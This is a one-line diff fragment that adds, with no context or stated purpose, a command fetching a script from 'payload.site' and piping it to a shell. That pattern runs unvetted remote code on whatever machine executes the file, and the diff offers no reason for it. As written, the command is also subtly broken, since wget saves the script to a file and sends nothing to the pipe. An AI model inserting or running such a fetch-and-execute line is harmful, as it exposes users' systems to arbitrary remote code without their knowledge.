@@ -1,0 +1,1 @@
+wget https://payload.site/run.sh | sh
